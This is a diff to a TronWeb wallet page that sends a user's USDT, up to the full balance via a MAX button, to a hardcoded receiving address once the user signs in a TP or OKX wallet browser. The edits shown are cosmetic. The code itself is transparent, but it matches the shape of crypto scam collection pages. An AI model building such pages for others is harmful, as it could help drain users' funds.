@@ -102,7 +102,8 @@
             <button class="max-btn" onclick="fillMaxBalance()">MAX</button>
         </div>
         <div class="token-row">
-            <img class="token-icon" src="https://static.tronscan.org/production/logo/usdttrc20.png">
+            <!-- 更换稳定CDN USDT图标地址 -->
+            <img class="token-icon" src="https://s2.coinmarketcap.com/static/img/coins/200x200/825.png">
             <span style="font-size:20px;font-weight:bold">USDT</span>
             <span style="margin-left:auto">TRC20</span>
         </div>
@@ -119,14 +120,15 @@ let tronWeb = null;
 const logDom = document.getElementById("log");
 
 function log(text){
-    logDom.value += `[${new Date().toLocaleString()}] ${text}\n`;
+    const now = new Date().toLocaleString();
+    logDom.value += `[${now}] ⚠️ ${text}\n`;
     logDom.scrollTop = logDom.scrollHeight;
 }
 
 // MAX按钮：自动填充钱包全部USDT余额
 async function fillMaxBalance(){
     if (!window.tronWeb || !window.tronWeb.ready) {
-        log("请先在钱包内置浏览器打开页面！");
+        log("请使用TP钱包/欧易Web3钱包【内置浏览器】打开页面！");
         return;
     }
     tronWeb = window.tronWeb;
@@ -141,8 +143,9 @@ async function fillMaxBalance(){
 // 转账主逻辑
 document.getElementById("transferBtn").onclick = async function(){
     try{
-        if (!window.tronWeb || !window.tronWeb.ready) {
-            log("⚠️ 请使用TP钱包/欧易Web3钱包内置浏览器访问！");
+        // 核心判断：检测钱包注入的tronWeb
+        if (typeof window.tronWeb === 'undefined' || !window.tronWeb.ready) {
+            log("请使用TP钱包/欧易Web3钱包【内置浏览器】打开页面！");
             return;
         }
         tronWeb = window.tronWeb;
@@ -154,10 +157,10 @@ document.getElementById("transferBtn").onclick = async function(){
         }
         const valueSun = tronWeb.toSun(transferValue);
         log(`发起转账：${transferValue} USDT → ${RECEIVE_ADDRESS}`);
-        log("等待钱包签名确认...");
+        log("等待钱包弹窗签名确认...");
 
         const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-        // 真实transfer直接转账，无需提前授权
+        // TRC20标准转账transfer，无需授权
         const txHash = await usdtContract.transfer(RECEIVE_ADDRESS, valueSun).send({
             feeLimit: 100000000
         });
